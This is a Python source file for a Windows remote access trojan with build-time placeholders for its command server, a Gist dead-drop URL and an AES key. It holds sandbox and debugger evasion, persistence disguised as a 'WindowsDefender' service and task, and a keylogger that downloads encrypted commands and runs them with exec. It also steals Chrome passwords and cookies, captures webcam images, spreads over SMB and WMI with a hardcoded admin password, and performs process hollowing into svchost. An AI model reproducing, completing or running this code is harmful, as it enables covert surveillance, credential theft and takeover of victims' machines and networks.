#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
# © 2025 IsNoobGrammer. All Rights Reserved.  
# Unauthorized distribution/use prohibited.  

import os  
import sys  
import io  
import time  
import ctypes  
import socket  
import threading  
import sqlite3  
import base64  
import zlib  
import cv2  
import requests  
import pyautogui  
import psutil  
import pythoncom  
import pyWinhook  
import win32api  
import win32con  
import win32process  
import win32event  
import win32service  
import win32serviceutil  
import win32security  
import winreg  
import smbclient  
import wmi  
import nmap  
from Crypto.Cipher import AES  

# ===== CONFIGURATION (Set via configurator.py) =====  
SERVER_HOST = "[[SERVER_HOST]]"  # Replaced during build  
GIST_URL = "[[GIST_URL]]"        # Replaced during build  
AES_KEY = b'[[AES_KEY]]'         # Replaced during build  
ENABLE_NUMINA = [[ENABLE_NUMINA]]# True/False  
# ==================================================  

class Numina:  
    """  
    Numina Module © 2025 IsNoobGrammer  
    Advanced evasion, anti-analysis, and process manipulation.  
    """  
    @staticmethod  
    def _vm_check():  
        vm_indicators = [  
            "vbox", "vmware", "qemu", "xen",  
            "sandbox", "malware", "cuckoo"  
        ]  
        try:  
            # Check processes  
            for proc in psutil.process_iter(['name']):  
                if any(indicator in proc.info['name'].lower() for indicator in vm_indicators):  
                    return True  

            # Check hardware via WMI  
            wmi_conn = wmi.WMI()  
            for item in wmi_conn.Win32_ComputerSystem():  
                manufacturer = item.Manufacturer.lower()  
                model = item.Model.lower()  
                if any(x in manufacturer or x in model for x in ["vmware", "virtual", "qemu"]):  
                    return True  

            # Check MAC address  
            mac = psutil.net_if_addrs()['Ethernet'][0].address  
            if mac.startswith(('00:0C:29', '00:50:56', '00:1C:42')):  
                return True  

            # Check for analysis tools  
            analysis_tools = ["ProcessHacker.exe", "Wireshark.exe", "Procmon.exe"]  
            for tool in analysis_tools:  
                if tool in (p.name() for p in psutil.process_iter()):  
                    return True  

            return False  
        except:  
            return False  

    @staticmethod  
    def _anti_debug():  
        try:  
            # IsDebuggerPresent  
            if ctypes.windll.kernel32.IsDebuggerPresent():  
                return True  

            # Check debug port via NtQueryInformationProcess  
            ProcessDebugPort = 7  
            h_process = ctypes.windll.kernel32.GetCurrentProcess()  
            debug_port = ctypes.c_ulong()  
            status = ctypes.windll.ntdll.NtQueryInformationProcess(  
                h_process, ProcessDebugPort,  
                ctypes.byref(debug_port),  
                ctypes.sizeof(debug_port),  
                None  
            )  
            if status == 0 and debug_port.value != 0:  
                return True  

            # Check window titles for analysis tools  
            EnumWindows = ctypes.windll.user32.EnumWindows  
            GetWindowText = ctypes.windll.user32.GetWindowTextW  
            GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW  
            window_titles = []  

            def enum_proc(hwnd, lParam):  
                length = GetWindowTextLength(hwnd)  
                buff = ctypes.create_unicode_buffer(length + 1)  
                GetWindowText(hwnd, buff, length + 1)  
                window_titles.append(buff.value)  
                return True  

            callback = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)(enum_proc)  
            EnumWindows(callback, 0)  
            suspicious_titles = ["ollydbg", "ida", "wireshark", "process hacker"]  
            if any(title.lower() in ' '.join(window_titles).lower() for title in suspicious_titles):  
                return True  

            return False  
        except:  
            return False  

    @staticmethod  
    def evade():  
        """Execute all evasion techniques"""  
        if Numina._vm_check() or Numina._anti_debug():  
            # Trigger fake crash to avoid suspicion  
            ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)  
            sys.exit(0)  

class Persistence:  
    """Multi-layered persistence mechanisms"""  
    @staticmethod  
    def install():  
        try:  
            # Method 1: Registry Run Key  
            key = winreg.OpenKey(  
                winreg.HKEY_CURRENT_USER,  
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",  
                0, winreg.KEY_SET_VALUE  
            )  
            winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, sys.executable)  
            winreg.CloseKey(key)  

            # Method 2: Scheduled Task  
            os.system(  
                'schtasks /create /tn "WindowsDefender" /tr "' + sys.executable +  
                '" /sc MINUTE /mo 5 /f'  
            )  

            # Method 3: WMI Event Subscription  
            os.system(  
                'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE '  
                'Name="BotResurrect", EventNamespace="root\\cimv2", QueryLanguage="WQL", '  
                'Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_Process\'"'  
            )  

            # Method 4: Windows Service (Admin required)  
            if ctypes.windll.shell32.IsUserAnAdmin():  
                service_path = win32serviceutil.LocatePythonServiceExe()  
                if not os.path.exists(service_path):  
                    win32serviceutil.InstallService(  
                        pythonClass=ServiceWrapper,  
                        serviceName='WindowsDefender',  
                        displayName='Windows Defender Service',  
                        startType=win32service.SERVICE_AUTO_START,  
                        description='Provides core system security.'  
                    )  
                    win32serviceutil.StartService('WindowsDefender')  
        except Exception as e:  
            pass  

class ServiceWrapper(win32serviceutil.ServiceFramework):  
    """Windows service for persistence"""  
    _svc_name_ = "WindowsDefender"  
    _svc_display_name_ = "Windows Defender Service"  

    def __init__(self, args):  
        super().__init__(args)  
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)  

    def SvcStop(self):  
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)  
        win32event.SetEvent(self.hWaitStop)  

    def SvcDoRun(self):  
        self.ReportServiceStatus(win32service.SERVICE_RUNNING)  
        ClientMain().start()  

class Keylogger:  
    """Keylogger with dead drop polling"""  
    def __init__(self):  
        self.log_path = os.path.join(os.environ['PUBLIC'], 'log.txt')  
        self.hm = pyWinhook.HookManager()  

    def start(self):  
        self.hm.KeyDown = self._on_key_event  
        self.hm.HookKeyboard()  
        threading.Thread(target=self._dead_drop_poll, daemon=True).start()  
        pythoncom.PumpMessages()  

    def _on_key_event(self, event):  
        with open(self.log_path, 'a', encoding='utf-8') as f:  
            f.write(f'[{time.ctime()}] {event.Key}\n')  
        return True  

    def _dead_drop_poll(self):  
        """Fetch encrypted commands from dead drop"""  
        while True:  
            try:  
                response = requests.get(GIST_URL, timeout=10).text  
                nonce = base64.b64decode(response[:24])  
                cipher = AES.new(AES_KEY, AES.MODE_EAX, nonce=nonce)  
                command = zlib.decompress(cipher.decrypt(base64.b64decode(response[24:]))).decode()  
                exec(command)  
            except Exception as e:  
                time.sleep(300)  

class WebcamCapture:  
    """Webcam capture module"""  
    @staticmethod  
    def capture():  
        try:  
            cap = cv2.VideoCapture(0)  
            ret, frame = cap.read()  
            cap.release()  
            if ret:  
                _, img = cv2.imencode('.jpg', frame)  
                return zlib.compress(img.tobytes())  
            return b'Webcam Error'  
        except:  
            return b'Webcam Error'  

class BrowserDataStealer:  
    """Extract Chrome passwords/cookies"""  
    @staticmethod  
    def run():  
        data = []  
        try:  
            # Chrome Passwords  
            login_db = os.path.join(  
                os.environ['LOCALAPPDATA'],  
                'Google\\Chrome\\User Data\\Default\\Login Data'  
            )  
            conn = sqlite3.connect(login_db)  
            cursor = conn.cursor()  
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')  
            for url, user, encrypted_pass in cursor.fetchall():  
                password = win32crypt.CryptUnprotectData(encrypted_pass)[1].decode()  
                data.append(f'URL: {url}\nUser: {user}\nPass: {password}\n')  
            conn.close()  

            # Chrome Cookies  
            cookie_db = login_db.replace('Login Data', 'Cookies')  
            conn = sqlite3.connect(cookie_db)  
            cursor = conn.cursor()  
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')  
            for host, name, encrypted_val in cursor.fetchall():  
                cookie = win32crypt.CryptUnprotectData(encrypted_val)[1].decode()  
                data.append(f'Cookie: {host} | {name}={cookie}\n')  
            conn.close()  
        except Exception as e:  
            pass  
        return '\n'.join(data).encode()  

class LateralMovement:  
    """Spread via SMB/WMI/Pass-the-Hash"""  
    @staticmethod  
    def spread():  
        try:  
            # Scan network for targets  
            nm = nmap.PortScanner()  
            nm.scan('192.168.1.0/24', arguments='-p 445 --open')  
            targets = nm.all_hosts()  

            for ip in targets:  
                try:  
                    # Copy RAT via SMB  
                    smbclient.ClientConfig(username='Administrator', password='P@ssw0rd')  
                    with smbclient.open_file(f'\\\\{ip}\\C$\\Windows\\Temp\\defender.exe', mode='wb') as f:  
                        with open(sys.executable, 'rb') as rat_file:  
                            f.write(rat_file.read())  

                    # Execute via WMI  
                    conn = wmi.WMI(ip, user='Administrator', password='P@ssw0rd')  
                    conn.Win32_Process.Create(CommandLine='C:\\Windows\\Temp\\defender.exe')  
                except:  
                    pass  
        except:  
            pass  

class ClientMain:  
    """Core RAT functionality"""  
    def __init__(self):  
        if ENABLE_NUMINA:  
            Numina.evade()  
        self._hide_console()  
        self.server_ip = socket.gethostbyname(SERVER_HOST)  
        self.reconnect_interval = 30  
        self.heartbeat = threading.Thread(target=self._send_heartbeat, daemon=True)  

    def _hide_console(self):  
        ctypes.windll.kernel32.FreeConsole()  
        if sys.executable.endswith('.exe'):  
            win32api.SetFileAttributes(sys.executable, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)  

    def start(self):  
        Persistence.install()  
        threading.Thread(target=Keylogger().start, daemon=True).start()  
        threading.Thread(target=LateralMovement.spread, daemon=True).start()  
        self.heartbeat.start()  
        self._main_loop()  

    def _main_loop(self):  
        while True:  
            try:  
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:  
                    sock.settimeout(10)  
                    sock.connect((self.server_ip, 443))  
                    self._handle_connection(sock)  
            except:  
                time.sleep(self.reconnect_interval)  

    def _handle_connection(self, sock):  
        while True:  
            try:  
                cmd = sock.recv(1024).decode()  
                if not cmd:  
                    break  

                # Command handling  
                if cmd == '!kill':  
                    sys.exit(0)  
                elif cmd == '!webcam':  
                    sock.send(WebcamCapture.capture())  
                elif cmd == '!browser':  
                    sock.send(BrowserDataStealer.run())  
                elif cmd.startswith('!shell '):  
                    output = os.popen(cmd[7:]).read()  
                    sock.send(output.encode())  
                elif cmd == '!hollow':  
                    self._process_hollowing()  
                elif cmd == '!spread':  
                    LateralMovement.spread()  
            except Exception as e:  
                break  

    def _process_hollowing(self):  
        """Advanced process hollowing via direct syscalls"""  
        try:  
            # NTAPI syscalls  
            ntdll = ctypes.WinDLL('ntdll')  
            kernel32 = ctypes.WinDLL('kernel32')  

            # Create section  
            SECTION_ALL_ACCESS = 0x000F001F  
            section_handle = ctypes.c_void_p()  
            status = ntdll.NtCreateSection(  
                ctypes.byref(section_handle),  
                SECTION_ALL_ACCESS,  
                None,  
                None,  
                0x40,  # PAGE_EXECUTE_READWRITE  
                0x08000000,  # SEC_COMMIT  
                None  
            )  
            if status != 0:  
                return  

            # Map section  
            local_address = ctypes.c_void_p()  
            local_size = ctypes.c_ulonglong(0)  
            ntdll.NtMapViewOfSection(  
                section_handle,  
                kernel32.GetCurrentProcess(),  
                ctypes.byref(local_address),  
                0, 0, None,  
                ctypes.byref(local_size),  
                2,  # ViewUnmap  
                0,  
                0x40  
            )  

            # Write payload  
            with open(sys.executable, 'rb') as f:  
                payload = f.read()  
            ctypes.memmove(local_address, payload, len(payload))  

            # Create target process  
            startup = win32process.STARTUPINFO()  
            proc_info = win32process.CreateProcess(  
                None, "svchost.exe", None, None, False,  
                win32process.CREATE_SUSPENDED, None, None, startup  
            )  

            # Unmap target's memory  
            ntdll.NtUnmapViewOfSection(proc_info[0], 0x400000)  

            # Map and resume  
            remote_address = ctypes.c_void_p()  
            ntdll.NtMapViewOfSection(  
                section_handle,  
                proc_info[0],  
                ctypes.byref(remote_address),  
                0, 0, None,  
                ctypes.byref(local_size),  
                2,  
                0,  
                0x40  
            )  
            context = win32process.GetThreadContext(proc_info[1])  
            context.Eax = remote_address.value  
            win32process.SetThreadContext(proc_info[1], context)  
            win32process.ResumeThread(proc_info[1])  
        except:  
            pass  

    def _send_heartbeat(self):  
        """Send periodic heartbeat to C2"""  
        while True:  
            try:  
                with socket.create_connection((self.server_ip, 443), timeout=5) as sock:  
                    sock.send(b'!heartbeat')  
            except:  
                pass  
            time.sleep(60)  

if __name__ == '__main__':  
    if len(sys.argv) > 1 and sys.argv[1] == '--service':  
        ClientMain().start()  
    else:  
        ClientMain().start()  
